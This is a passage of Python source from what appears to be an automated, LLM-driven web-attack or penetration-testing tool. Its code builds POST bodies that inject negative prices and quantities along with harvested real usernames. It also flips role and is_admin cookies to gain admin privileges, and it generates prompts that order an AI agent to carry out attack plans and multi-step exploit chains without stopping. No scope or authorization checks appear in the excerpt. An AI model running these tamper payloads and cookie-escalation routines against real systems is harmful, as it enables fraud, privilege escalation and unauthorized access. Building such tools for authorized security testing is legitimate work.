                    val = (f.get("value", "") or "").strip()
                    if val and val.upper() not in ("", "0", "1", "FALSE", "TRUE", "NULL"):
                        return val
    # 2. URL query parameters in any captured exchange
    from urllib.parse import parse_qs, urlparse as _up
    for ex in getattr(recon, "exchanges", []) or []:
        try:
            params = parse_qs(_up(ex.url or "").query, keep_blank_values=False)
            for k, vals in params.items():
                if k.lower() == fn_l and vals:
                    v = vals[0].strip()
                    if v and v.upper() not in ("0", "1", "FALSE", "TRUE"):
                        return v
        except Exception:
            continue
    return ""


# Keep old name as alias (called from _blf_full_payload via the redirect branch)
_observed_redirect_value = _observed_field_value


def _blf_full_payload(recon, dossier, body_store) -> dict:
    """Build a complete, ready-to-send POST body for a BLF manipulation.

    Money/qty fields get out-of-range values (-100 / -1). Identity fields (recipient,
    username, …) get a REAL other username pulled from recon so the request is not
    rejected for a missing/invalid recipient. Redirect/enum fields (redir, return, next)
    get their observed recon value or "CART" to avoid 400 "Missing parameter" rejections.
    Other fields get a benign default.
    Returns {} if no tamperable money/qty field is known for the endpoint.
    """
    endpoint = dossier.endpoint
    attacker = (getattr(dossier.auth, "attacker_role", "") or "").lower()

    field_names: list[str] = []
    if recon is not None:
        # Scan ALL exchanges for forms whose action targets this endpoint (not just
        # exchanges on this endpoint — the form may live on a different page, e.g. /product)
        from urllib.parse import urlparse as _up
        target_ep = endpoint.rstrip("/")
        for ex in recon.exchanges:
            for form in ex.forms:
                action = form.get("action", "") or ""
                try:
                    action_path = _up(action).path.rstrip("/") if action else ""
                except Exception:
                    action_path = ""
                if action_path == target_ep or ex.endpoint.rstrip("/") == target_ep:
                    for f in form.get("fields", []):
                        n = f.get("name", "")
                        if n and n not in field_names:
                            field_names.append(n)
        for ep in recon.endpoints:
            if ep.endpoint == endpoint:
                for n in ep.parameters:
                    if n not in field_names:
                        field_names.append(n)

    others = [u for u in _known_usernames(recon, body_store) if u and u.lower() != attacker]

    body: dict[str, str] = {}
    has_tamper = False
    for n in field_names:
        ln = n.lower()
        if any(k in ln for k in _BLF_SKIP_KW):
            continue
        if any(k in ln for k in _BLF_MONEY_KW):
            body[n] = "-100"
            has_tamper = True
        elif any(k in ln for k in _BLF_QTY_KW):
            body[n] = "-1"
            has_tamper = True
        elif any(k in ln for k in _BLF_IDENTITY_KW):
            # Use a real username from recon; skip if none found (better to omit
            # than to guess a nonexistent username that causes a 400/404)
            body[n] = others[0] if others else "test_user"
        elif any(ln == k or ln.endswith(k) for k in _BLF_REDIRECT_KW):
            # Redirect/navigation field (redir, return, next, return_url…).
            # These aren't the tamper target — we just need a valid value so the
            # server doesn't reject the request with "Missing parameter".
            # Source of truth: what the app itself used in captured recon traffic.
            # No hardcoded fallback — derive from the form's own action path instead.
            observed = _observed_field_value(recon, n)
            if observed:
                body[n] = observed
            else:
                # Last resort: the form's action endpoint is the most likely redirect target.
                # e.g. form action="/cart" → field is probably redirecting back to /cart.
                # Use the dossier endpoint path component (without leading slash) as-is,
                # which matches URL-based redirect values (/cart → "cart" or "/cart").
                ep_tail = (dossier.endpoint or "").rstrip("/").rsplit("/", 1)[-1]
                body[n] = ep_tail if ep_tail else dossier.endpoint or ""
        else:
            body[n] = "1"

    if not has_tamper:
        return {}
    return body


_ROLE_COOKIE_KEYS = (
    "role", "is_admin", "isadmin", "admin", "is_staff", "usertype", "user_type",
    "access_level", "privilege", "permissions", "account_type", "tier",
    "is_superuser", "group", "user_role", "auth_level",
)


def _has_role_cookie(cookie_header: str) -> bool:
    low = (cookie_header or "").lower()
    return any(f"{k}=" in low for k in _ROLE_COOKIE_KEYS)


def _tamper_admin_cookie(cookie_header: str) -> tuple[str, bool]:
    """Flip a plaintext role/is_admin cookie to an admin value, keeping session etc. intact.
    Returns (new_cookie, flipped?)."""
    out: list[str] = []
    flipped = False
    for part in (cookie_header or "").split(";"):
        part = part.strip()
        if not part or "=" not in part:
            if part:
                out.append(part)
            continue
        k, v = part.split("=", 1)
        kl = k.strip().lower()
        vl = v.strip().lower()
        if kl == "role" or kl in ("usertype", "user_type", "is_staff"):
            out.append(f"{k.strip()}=admin"); flipped = True
        elif kl in ("is_admin", "isadmin", "admin"):
            # Preserve the original value's format:
            # boolean string "false"→"true", integer "0"→"1", unknown→"true"
            if vl in ("false", "no", "off"):
                out.append(f"{k.strip()}=true"); flipped = True
            elif vl in ("0",):
                out.append(f"{k.strip()}=1"); flipped = True
            elif vl not in ("true", "yes", "on", "1", "admin"):
                # Unknown non-admin value — try "true"
                out.append(f"{k.strip()}=true"); flipped = True
            else:
                out.append(f"{k.strip()}={v}")  # already admin, no change
        else:
            out.append(f"{k.strip()}={v}")
    return "; ".join(out), flipped


def _blf_plan_text(dossier, payload: dict) -> str:
    """Render the concrete BLF attack plan the exec agent must execute."""
    attacker = getattr(dossier.auth, "attacker_role", "") or "anon"
    if payload:
        body_json = json.dumps(payload)
        return (
            f"BLF ATTACK PLAN (required) — pattern {dossier.pattern_id}. Reading pages is NOT proof; "
            f"you must actively manipulate a value:\n"
            f"1. GET a state page first (cart / balance / order summary) to record the BEFORE value. "
            f"   Then call http_body_get on that exchange to read the numeric total/balance from the body.\n"
            f"2. http_request POST to {dossier.endpoint} as actor '{attacker}' with this exact body: {body_json}\n"
            f"   (the negative number is an out-of-range value the server SHOULD reject).\n"
            f"   NOTE: A 302 response to a POST is NORMAL for HTML form apps — it means the POST was "
            f"   accepted; follow up with a GET to read the new state, do NOT treat 302 as a failure.\n"
            f"3. GET the same state page again to see the updated value.\n"
            f"4. CRITICAL — call http_body_get on that GET exchange and read the numeric total/balance. "
            f"   SUCCESS = the body shows an invalid value (negative total, wrong balance, 0-price order).\n"
            f"   Do NOT judge by status code alone — check the actual numeric value in the body."
        )
    return (
        f"BLF ATTACK PLAN (required) — pattern {dossier.pattern_id}. You MUST POST a manipulated "
        f"value to {dossier.endpoint} as actor '{attacker}' (a negative amount/quantity such as -100 "
        f"or -1) using the real form field names. After each POST, GET the state page and call "
        f"http_body_get to read the numeric total from the body. Reading status codes alone is insufficient."
    )


# Patterns whose proof requires several ordered requests, not one value-tamper POST.
_CHAIN_PATTERNS = {"BLF-03", "BLF-05"}


def _count_steps(text: str) -> int:
    """Count ordered steps ('1. ', '2. ' …) in an exploit approach."""
    return len(re.findall(r"(?m)(?:^|\s)\d+[.)]\s", text or ""))


def _is_chain(dossier) -> bool:
    """A multi-step business-logic chain (sequence/coupon abuse, or a ≥3-step approach)."""
    return dossier.pattern_id in _CHAIN_PATTERNS or _count_steps(getattr(dossier, "exploit_approach", "")) >= 3


def _max_steps_for(dossier) -> int:
    """Give chains room to complete several ordered requests + re-reads."""
    if _is_chain(dossier):
        return 20
    if dossier.category.value == "BLF":
        return 20  # BLF needs more room: baseline read + tamper POST + re-read + body inspection
    return 12


def _chain_plan_text(dossier) -> str:
    """Steering for a multi-step chain: execute the dossier's own ordered approach to the end.

    Generic by construction — the steps come from the (recon-grounded) dossier approach, not a
    hardcoded per-app script, so this works for any sequence/coupon/refund chain on any target.
    """
    approach = (getattr(dossier, "exploit_approach", "") or "").strip()
    return (
        f"MULTI-STEP CHAIN (required) — pattern {dossier.pattern_id}. This flaw is proven only by "
        f"several requests in a specific ORDER; one request is NOT proof. Execute EVERY step below in "
        f"order, using real inputs from 'Known-Good Values' (valid product id / coupon code / username), "
        f"and re-read state at the end to confirm the rule was broken:\n"
        f"{approach}\n"
        f"CHAIN TIPS: (1) If a step requires populating state first (e.g. adding an item before "
        f"checkout), do it using real values from Known-Good Values. (2) If a step fails with "
        f"a balance/funds/limit error, try with a cheaper item or smaller amount. (3) If a step "
        f"needs a value you don't have yet (e.g. a coupon code), DISCOVER it first by reading "
        f"a relevant page after populating state. Do NOT stop until you have attempted the FINAL "
        f"step of the chain."
    )


def _body_has_bad_value(body) -> bool:
    """True if the request body contains a clearly out-of-range number (negative).

    Only negative values are universally invalid. Large positive values are NOT flagged
    because many currencies (VND, KRW, IDR) routinely use values > 1M.
    """
    if body is None:
        return False
    s = body if isinstance(body, str) else json.dumps(body, default=str)
    for m in re.finditer(r'-?\d+(?:\.\d+)?', s):
        try:
            n = float(m.group())
        except ValueError:
            continue
        if n < 0:
            return True
    return False


def _windowed(messages: list[dict], keep_recent: int = 8) -> list[dict]:
    """Sliding context window for the exec tool-loop: always keep the system prompt
    and the first user turn (the task), then only the most recent `keep_recent` turns.
    Prevents unbounded context growth that pushes the system instructions out of view."""
    if len(messages) <= keep_recent + 2:
        return messages
    head = messages[:2]  # system + "Begin execution."
    tail = messages[-keep_recent:]
    note = {"role": "user", "content": "[older steps omitted to keep context focused]"}
    return head + [note] + tail


def _tool_surface() -> str:
    """List every tool the Exec agent may call. The agent decides which to use and
    when — there is no phase-based gating. HTTP is preferred for proof capture (all
    HTTP goes through the recorder); browser/shell/filesystem are available when the
    target needs JS rendering, local scripting, or workspace inspection."""
    lines = ["Available tools (you decide which to call):"]
    for spec in TOOL_DEFINITIONS:
        fn = spec["function"]
        lines.append(f"- {fn['name']}: {fn['description']}")
    return "\n".join(lines)


def _extract_tool_calls(response: str) -> list[dict]:
    """Extract tool call requests from LLM response text.

    Handles multiple formats that different models emit:
      1. CALL: http_request({"method": ...})
      2. [TOOL_CALL]{tool => "http_request", args => {...}}[/TOOL_CALL]
      3. <FunctionCall>tool_name: http_request\ntool_args: {...}</FunctionCall>
      4. {"tool": "http_request", "args": {...}}
      5. {"name": "http_request", "arguments": {...}}
      6. ```json\n{"tool": "http_request", ...}\n``` (markdown code block)
    """
    calls = []

    # Format 6: markdown code block (```json ... ``` or ``` ... ```)
    for m in re.finditer(r'```(?:json)?\s*(\{.*?\})\s*```', response, re.DOTALL | re.IGNORECASE):
        try:
            obj = json.loads(m.group(1))
            tool_name = obj.get("tool") or obj.get("name", "")
            if tool_name in _KNOWN_TOOL_NAMES:
                args = obj.get("args") or obj.get("arguments") or obj.get("parameters") or {}
                if isinstance(args, dict):
                    calls.append({"name": tool_name, "args": args})
        except Exception:
            pass

    # Format 1: CALL: tool_name({...})
    for m in re.finditer(r'CALL:\s*(\w+)\s*\((\{.*?\})\)', response, re.DOTALL):
        try:
            calls.append({"name": m.group(1), "args": json.loads(m.group(2))})
        except Exception:
            pass

    # Format 2: [TOOL_CALL] block — may use => or : separators
    for m in re.finditer(r'\[TOOL_CALL\](.*?)\[/TOOL_CALL\]', response, re.DOTALL | re.IGNORECASE):
        parsed = _parse_kv_block(m.group(1))
        if parsed:
            calls.append(parsed)

    # Format 3: <FunctionCall> block
    for m in re.finditer(r'<FunctionCall>(.*?)</FunctionCall>', response, re.DOTALL | re.IGNORECASE):
        parsed = _parse_kv_block(m.group(1))
        if parsed:
            calls.append(parsed)

    # Format 4 & 5: raw JSON objects (handle nested braces properly)
    # Scan for every '{' and try json.raw_decode to find valid JSON objects
    decoder = json.JSONDecoder()
    pos = 0
    while pos < len(response):
        idx = response.find('{', pos)
        if idx == -1:
            break
        try:
            obj, end = decoder.raw_decode(response, idx)
            if isinstance(obj, dict):
                tool_name = obj.get("tool") or obj.get("name", "")
                if tool_name in _KNOWN_TOOL_NAMES:
                    args = obj.get("args") or obj.get("arguments") or obj.get("parameters") or {}
                    if isinstance(args, dict):
                        calls.append({"name": tool_name, "args": args})
            pos = end
        except json.JSONDecodeError:
            pos = idx + 1

    # Deduplicate by (name, url)
    # Dedup on the FULL call signature — NOT just (name, url). A baseline request and a
    # tampered request to the same URL (different cookie/body/actor) are distinct and BOTH
    # must survive; they are exactly the pair that proves BAC-02 / IDOR.
    seen: set[tuple] = set()
    unique = []
    for c in calls:
        a = c["args"]
        cookie = (a.get("headers") or {}).get("Cookie") or (a.get("headers") or {}).get("cookie") or ""
        key = (
            c["name"],
            json.dumps(a, sort_keys=True, default=str),
            a.get("actor", ""),
            cookie,
        )
        if key not in seen:
            seen.add(key)
            unique.append(c)

    return unique


def _parse_kv_block(text: str) -> dict | None:
    """Parse a loose key-value block (supports both => and : separators)."""
    # Try to find tool name
    tool_m = re.search(r'"?tool(?:_name)?"\s*(?:=>|:)\s*"?(\w+)"?', text, re.IGNORECASE)
    if not tool_m:
        return None
    tool_name = tool_m.group(1)

    # Try to find args as JSON object
    args: dict = {}
    json_m = re.search(r'"?(?:args|tool_args|arguments)"\s*(?:=>|:)\s*(\{.*?\})', text, re.DOTALL | re.IGNORECASE)
    if json_m:
        try:
            args = json.loads(json_m.group(1))
        except Exception:
            pass

    # Fallback: parse --key value CLI-style args
    if not args:
        for km in re.finditer(r'--(\w+)\s+"?([^"\n,]+)"?', text):
            args[km.group(1)] = km.group(2).strip()

    return {"name": tool_name, "args": args} if tool_name else None
